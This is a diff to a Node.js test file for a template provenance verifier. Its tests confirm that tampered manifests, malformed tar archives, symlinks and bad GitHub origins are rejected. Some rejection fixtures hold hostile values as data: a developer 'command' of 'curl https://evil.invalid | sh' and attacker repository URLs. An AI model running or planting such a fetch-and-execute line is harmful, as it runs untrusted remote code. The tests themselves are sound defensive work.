@@ -1,6 +1,6 @@
 import assert from "node:assert/strict";
 import { createHash } from "node:crypto";
-import { cp, mkdtemp, readFile, rm, symlink, writeFile } from "node:fs/promises";
+import { cp, mkdir, mkdtemp, readFile, rm, symlink, writeFile } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join, resolve } from "node:path";
 import { gunzipSync, gzipSync } from "node:zlib";
@@ -38,6 +38,7 @@ function run(fixture) { return spawnSync(process.execPath, [verifier, "--templat
 async function derivedFixture(t) { const value = await fixture(); t.after(() => rm(value.directory, { recursive: true, force: true })); await provenance(value.project, value.descriptor); return value; }
 async function bindArchive(value) { value.descriptor.archiveSha256 = digest(await readFile(value.archive)); await writeFile(value.candidate, `${JSON.stringify(value.descriptor, null, 2)}\n`); await provenance(value.project, value.descriptor); }
 function rewriteTarHeader(tar, name, mutate) { const offset = tar.indexOf(Buffer.from(`${name}\0`, "ascii")); assert.notEqual(offset, -1, `fixture archive must include ${name}`); mutate(offset); tar.fill(0x20, offset + 148, offset + 156); const checksum = tar.subarray(offset, offset + 512).reduce((sum, byte) => sum + byte, 0).toString(8).padStart(6, "0"); tar.write(`${checksum}\0 `, offset + 148, "ascii"); }
+function terminalOffset(tar) { for (let offset = 0; offset + 1024 <= tar.length; offset += 512) if (tar.subarray(offset, offset + 512).every((byte) => byte === 0) && tar.subarray(offset + 512, offset + 1024).every((byte) => byte === 0)) return offset; assert.fail("fixture archive must contain a two-block terminal record"); }
 test("valid local archive project is admitted using the owner candidate tuple", async (t) => { const value = await derivedFixture(t); const result = run(value); assert.equal(result.status, 0, result.stderr); assert.match(result.stdout, /"verified": true/); });
 test("safe identity, GitHub identity and example configuration changes are admitted", async (t) => { const value = await fixture(); t.after(() => rm(value.directory, { recursive: true, force: true })); const origin = { kind: "github-derived", repository: "example/lasso-weather" }; await provenance(value.project, value.descriptor, origin); const manifest = JSON.parse(await readFile(join(value.project, "service.json"), "utf8")); manifest.id = "weather-service"; manifest.name = "Weather Service"; manifest.meta.repository.url = "https://github.com/example/lasso-weather.git"; await writeFile(join(value.project, "service.json"), `${JSON.stringify(manifest, null, 2)}\n`); await writeFile(join(value.project, "config", "example.env"), "ECHO_MESSAGE=weather\n"); const result = run(value); assert.equal(result.status, 0, result.stderr); });
 test("invented commit and archive digests are denied even when provenance is well formed", async (t) => { const value = await derivedFixture(t); const invented = { ...value.descriptor, templateCommit: "b".repeat(40), archiveSha256: "a".repeat(64) }; await writeFile(value.candidate, `${JSON.stringify(invented, null, 2)}\n`); await provenance(value.project, invented); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /candidate_binding/); });
@@ -66,6 +67,14 @@ test("derived policy byte substitution is denied", async (t) => {
 test("local archive cannot edit repository URL", async (t) => {
   const value = await derivedFixture(t); const manifest = JSON.parse(await readFile(join(value.project, "service.json"), "utf8")); manifest.meta.repository.url = "https://attacker.invalid/evil.git"; await writeFile(join(value.project, "service.json"), `${JSON.stringify(manifest, null, 2)}\n`); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /github_identity/);
 });
+test("GitHub-derived repository URLs enforce declared size and type constraints", async (t) => {
+  const oversized = await fixture(); t.after(() => rm(oversized.directory, { recursive: true, force: true })); const owner = "o".repeat(130); const repository = "r".repeat(130); const origin = { kind: "github-derived", repository: `${owner}/${repository}` }; await provenance(oversized.project, oversized.descriptor, origin); const oversizedManifest = JSON.parse(await readFile(join(oversized.project, "service.json"), "utf8")); oversizedManifest.meta.repository.url = `https://github.com/${origin.repository}.git`; await writeFile(join(oversized.project, "service.json"), `${JSON.stringify(oversizedManifest, null, 2)}\n`); let result = run(oversized); assert.notEqual(result.status, 0); assert.match(result.stderr, /github_identity/);
+  const wrongType = await fixture(); t.after(() => rm(wrongType.directory, { recursive: true, force: true })); await provenance(wrongType.project, wrongType.descriptor, { kind: "github-derived", repository: "example/lasso-weather" }); const typedManifest = JSON.parse(await readFile(join(wrongType.project, "service.json"), "utf8")); typedManifest.meta.repository.url = { url: "https://github.com/example/lasso-weather.git" }; await writeFile(join(wrongType.project, "service.json"), `${JSON.stringify(typedManifest, null, 2)}\n`); result = run(wrongType); assert.notEqual(result.status, 0); assert.match(result.stderr, /github_identity/);
+});
+test("unknown and malformed provenance origins are denied", async (t) => {
+  const unknown = await derivedFixture(t); await provenance(unknown.project, unknown.descriptor, { kind: "unknown" }); let result = run(unknown); assert.notEqual(result.status, 0); assert.match(result.stderr, /origin/);
+  const malformed = await derivedFixture(t); await provenance(malformed.project, malformed.descriptor, { kind: "github-derived", repository: "example/lasso/weather" }); result = run(malformed); assert.notEqual(result.status, 0); assert.match(result.stderr, /origin/);
+});
 test("editable developer records reject commands, secrets, and wrong types", async (t) => {
   for (const developer of [{ name: "author", command: "curl https://evil.invalid | sh" }, { name: "author", token: "secret-value" }, "author"]) { const value = await derivedFixture(t); const manifest = JSON.parse(await readFile(join(value.project, "service.json"), "utf8")); manifest.meta.developers = [developer]; await writeFile(join(value.project, "service.json"), `${JSON.stringify(manifest, null, 2)}\n`); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /unsafe_manifest_value/); }
 });
@@ -73,6 +82,12 @@ test("archive compressed, expanded, and path-depth quotas are denied before acce
   const value = await derivedFixture(t); await writeFile(value.archive, Buffer.alloc(policy.quotas.maximumArchiveBytes + 1)); await bindArchive(value); let result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /archive_quota/);
   const expanded = await derivedFixture(t); await writeFile(expanded.archive, gzipSync(Buffer.alloc(policy.quotas.maximumArchiveExpandedBytes + 1), { mtime: 0 })); await bindArchive(expanded); result = run(expanded); assert.notEqual(result.status, 0); assert.match(result.stderr, /archive_quota/);
   const depth = await derivedFixture(t); const tar = gunzipSync(await readFile(depth.archive)); rewriteTarHeader(tar, ".gitattributes", (offset) => tar.write("a/b/c/d/e/f/g/h/i/j/k/l", offset, "ascii")); await writeFile(depth.archive, gzipSync(tar, { mtime: 0 })); await bindArchive(depth); result = run(depth); assert.notEqual(result.status, 0); assert.match(result.stderr, /candidate_archive/);
+});
+test("archive terminal record requires two zero blocks and only zero padding", async (t) => {
+  const valid = await derivedFixture(t); const tar = gunzipSync(await readFile(valid.archive)); const footer = terminalOffset(tar);
+  for (const [name, malformed] of [["truncated", tar.subarray(0, footer)], ["one-block", tar.subarray(0, footer + 512)], ["nonzero-trailing", Buffer.concat([tar, Buffer.from([1])])], ["concatenated", Buffer.concat([tar, tar])]]) {
+    const value = await derivedFixture(t); await writeFile(value.archive, gzipSync(malformed, { mtime: 0 })); await bindArchive(value); const result = run(value); assert.notEqual(result.status, 0, name); assert.match(result.stderr, /candidate_archive/, name);
+  }
 });
 test("altered executable baseline is denied", async (t) => { const value = await derivedFixture(t); await writeFile(join(value.project, "runtime", "linux", "echo-service.sh"), "#!/usr/bin/env bash\necho altered\n"); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /immutable_baseline/); });
 test("arbitrary artifact source change is denied", async (t) => { const value = await derivedFixture(t); const manifest = JSON.parse(await readFile(join(value.project, "service.json"), "utf8")); manifest.artifact.source.repo = "attacker/example"; await writeFile(join(value.project, "service.json"), `${JSON.stringify(manifest, null, 2)}\n`); const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /forbidden_manifest_change/); });
@@ -84,5 +99,13 @@ async function assertLinkDenied(t, name, type) {
   try { await symlink(type === "dir" ? join(value.project, "runtime") : join(value.project, "README.md"), join(value.project, name), type); } catch (error) { if (["EPERM", "EACCES", "ENOTSUP"].includes(error.code)) return t.skip(`link creation is unavailable: ${error.code}`); throw error; }
   const result = run(value); assert.notEqual(result.status, 0); assert.match(result.stderr, /project_object/);
 }
-test("a file symlink is denied before allowlist and content reads", async (t) => assertLinkDenied(t, "forged-file", "file"));
-test("a directory symlink is denied before traversal", async (t) => assertLinkDenied(t, "forged-directory", "dir"));
+test("a reserved-name file symlink is denied before exclusion and allowlist", async (t) => assertLinkDenied(t, "node_modules", "file"));
+test("a reserved-name directory symlink is denied before exclusion and traversal", async (t) => assertLinkDenied(t, "node_modules", "dir"));
+async function assertGeneratorLinkDenied(t, type) {
+  const directory = await mkdtemp(join(tmpdir(), "template-contract-generator-")); t.after(() => rm(directory, { recursive: true, force: true })); await mkdir(join(directory, "nested")); await writeFile(join(directory, "template-contract.json"), "{}\n"); await writeFile(join(directory, "README.md"), "fixture\n");
+  for (const command of [["init", "-q", "--initial-branch=fixture-contract"], ["add", "."], ["-c", "user.name=Contract Test", "-c", "user.email=contract@example.invalid", "commit", "-qm", "fixture"]]) { const result = spawnSync("git", command, { cwd: directory, encoding: "utf8" }); assert.equal(result.status, 0, result.stderr); }
+  try { await symlink(type === "dir" ? join(directory, "nested") : join(directory, "README.md"), join(directory, "node_modules"), type); } catch (error) { if (["EPERM", "EACCES", "ENOTSUP"].includes(error.code)) return t.skip(`link creation is unavailable: ${error.code}`); throw error; }
+  const result = spawnSync(process.execPath, [join(root, "scripts", "generate-template-contract.mjs")], { cwd: directory, encoding: "utf8" }); assert.notEqual(result.status, 0); assert.match(result.stderr, /Template inventory rejects links and non-regular objects/);
+}
+test("contract generator rejects a reserved-name file link before exclusion", async (t) => assertGeneratorLinkDenied(t, "file"));
+test("contract generator rejects a reserved-name directory link before exclusion", async (t) => assertGeneratorLinkDenied(t, "dir"));
